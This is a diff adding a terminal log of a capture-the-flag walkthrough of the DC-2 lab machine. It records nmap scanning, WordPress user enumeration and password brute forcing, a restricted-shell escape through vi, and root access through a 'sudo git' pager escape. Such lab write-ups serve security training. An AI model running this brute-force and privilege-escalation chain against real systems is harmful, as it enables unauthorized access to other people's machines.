@@ -1,0 +1,168 @@
+hack@kali:~$ nmap -A -p- 192.168.1.7
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 19:27 CEST
+Nmap scan report for DC-2.homenet.telecomitalia.it (192.168.1.7)
+Host is up (0.00039s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Did not follow redirect to http://dc-2/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
+|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
+|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
+|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds
+
+
+
+Flag 1:
+
+Your usual wordlists probably won't work, so instead, maybe you just need to be cewl.
+
+More passwords is always better, but sometimes you just can't win them all.
+
+Log in as one to see the next flag.
+
+If you can't find it, log in as another.
+
+
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] jerry
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] tom
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+
+hack@kali:~/CTF/DC_2$ wpscan --url http://dc-2/ -P list.txt
+
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - jerry / adipiscing                                                                     
+[SUCCESS] - tom / parturient
+
+
+Flag 2:
+
+If you can't exploit WordPress and take a shortcut, there is another way.
+
+Hope you found another entry point. 
+
+
+hack@kali:~/CTF/DC_2$ ssh tom@192.168.1.7 -p 7744
+tom@192.168.1.7's password: 
+
+The programs included with the Debian GNU/Linux system are free software;                          
+the exact distribution terms for each program are described in the                                 
+individual files in /usr/share/doc/*/copyright.                                                    
+                                                                                                   
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                  
+permitted by applicable law.                                                                       
+tom@DC-2:~$ 
+
+
+
+Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+
+
+tom@DC-2:~$ vi
+
+:!set shell=/bin/sh
+:shell
+
+$ 
+$ ls
+flag3.txt  na  usr
+$ cd usr
+$ ls
+bin
+$ cd ..
+$ 
+$ 
+$ 
+$ sudo -l
+/bin/sh: 9: sudo: not found
+$ python -c "import pty;pty.spawn('/bin/bash')"
+/bin/sh: 10: python: not found
+$ export PATH=/bin:/usr/bin:$PATH
+$ export SHELL=/bin/bash:$SHELL
+$ 
+$ 
+$ sudo -l
+[sudo] password for tom: 
+Sorry, user tom may not run sudo on DC-2.
+
+$ su jerry
+Password: 
+jerry@DC-2:/home/tom$ 
+
+jerry@DC-2:~$ pwd
+/home/jerry
+jerry@DC-2:~$ cat flag4.txt 
+Good to see that you've made it this far - but you're not home yet. 
+
+You still need to get the final flag (the only flag that really counts!!!).  
+
+No hints here - you're on your own now.  :-)
+
+Go on - git outta here!!!!
+
+jerry@DC-2:~$ 
+
+
+jerry@DC-2:~$ sudo -l
+Matching Defaults entries for jerry on DC-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+jerry@DC-2:~$ 
+jerry@DC-2:~$ 
+jerry@DC-2:~$ sudo git branch --help config
+
+
+----> !/bin/sh
+# 
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd
+# ls
+final-flag.txt
+# cat final-flag.txt
+ __    __     _ _       _                    _ 
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+# 
+
